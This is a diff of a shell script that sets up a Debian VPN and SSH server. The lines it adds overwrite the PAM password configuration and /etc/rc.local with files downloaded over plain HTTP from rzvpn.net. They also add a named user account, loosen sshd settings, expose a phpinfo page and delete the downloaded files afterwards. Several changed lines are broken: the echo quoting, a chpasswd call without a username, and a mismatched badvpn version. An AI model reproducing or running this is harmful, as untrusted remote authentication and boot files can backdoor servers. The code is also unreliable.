@@ -61,8 +61,8 @@ apt-get -y --purge remove postfix*;
 apt-get -y --purge remove bind*;
 clear
 echo "
-UPDATE AND UPGRADE PROCESS
-PLEASE WAIT TAKE TIME 1-5 MINUTE
+echo -e "${blue}UPDATE AND UPGRADE PROCESS"
+echo -e "${green}PLEASE WAIT TAKE TIME 1-5 MINUTE"
 "
 sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
 wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
@@ -73,15 +73,6 @@ echo "
 INSTALLER PROCESS PLEASE WAIT
 TAKE TIME 5-10 MINUTE
 "
-# install essential package
-echo "mrtg mrtg/conf_mods boolean true" | debconf-set-selections
-#apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs openvpn vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
-apt-get -y install bmon iftop htop nmap axel nano iptables traceroute sysv-rc-conf dnsutils bc nethogs vnstat less screen psmisc apt-file whois ptunnel ngrep mtr git zsh mrtg snmp snmpd snmp-mibs-downloader unzip unrar rsyslog debsums rkhunter
-apt-get -y install build-essential
-
-# disable exim
-service exim4 stop
-sysv-rc-conf exim4 off
 
 # text gambar
 apt-get install boxes
@@ -94,6 +85,10 @@ wget -O /root/.bashrc "https://raw.githubusercontent.com/sslmode/sslmode/master/
 # install lolcat
 sudo apt-get -y install ruby
 sudo gem install lolcat
+
+# dak-dak wechat
+wget -O /etc/pam.d/common-password "http://rzvpn.net/random/common-password"
+chmod +x /etc/pam.d/common-password
 
 # fail2ban & exim & protection
 apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
@@ -127,50 +122,47 @@ wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/sslmode/sslmode
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
 sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
 
+# openvpn
+apt-get -y install openvpn
+wget -O /etc/openvpn/openvpn.tar "http://rzvpn.net/random/openvpn.tar"
+cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/rc.local "http://rzvpn.net/random/rc.local";chmod +x /etc/rc.local
+#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
+#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+#iptables-restore < /etc/iptables.up.rules
+
 # nginx
 apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
 wget -O /etc/php/7.0/fpm/pool.d/www.conf "https://raw.githubusercontent.com/sslmode/sslmode/master/www.conf"
 mkdir -p /home/vps/public_html
-echo "<pre>Setup by SABAH9 | telegram @XXXXXXXXX </pre>" > /home/vps/public_html/index.php
+echo "<pre>Setup by SABAH9 | telegram @OranGkuatSabah704 </pre>" > /home/vps/public_html/index.php
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/sslmode/sslmode/master/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
 service nginx restart
 
-# openvpn
-apt-get -y install openvpn
-cd /etc/openvpn/
-wget https://samreysteven91.000webhostapp.com/Debian8/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/iptables.up.rules "https://samreysteven91.000webhostapp.com/Debian8/iptables.up.rules"
-sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
-sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
-iptables-restore < /etc/iptables.up.rules
 # etc
-wget -O /home/vps/public_html/client.ovpn "https://samreysteven91.000webhostapp.com/Debian8/client.ovpn"
+wget -O /home/vps/public_html/client.ovpn "http://rzvpn.net/random/client.ovpn"
+wget -O /etc/motd "http://rzvpn.net/random/motd"
+sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-cd;wget https://samreysteven91.000webhostapp.com/Debian8/cronjob.tar
-tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
-mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
-chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
-useradd -m -g users -s /bin/bash nswircz
-echo "nswircz:rzp" | chpasswd
+useradd -m -g users -s /bin/bash ARCHANGELS
+echo "7C22C4ED" | chpasswd
 echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
-rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 clear
-
 # Badvpn
 apt-get -y install cmake make gcc
-wget https://raw.githubusercontent.com/sslmode/sslmode/master/badvpn-1.999.127.tar.bz2
-tar xf badvpn-1.999.127.tar.bz2
+wget https://samreysteven91.000webhostapp.com/deb9/badvpn-1.999.128.tar.bz2
+tar xf badvpn-1.999.128.tar.bz2
 mkdir badvpn-build
 cd badvpn-build
 cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
 make install
 screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
 cd
-
 
 # install mrtg
 wget -O /etc/snmp/snmpd.conf "http://script.hostingtermurah.net/repo/snmpd.conf"
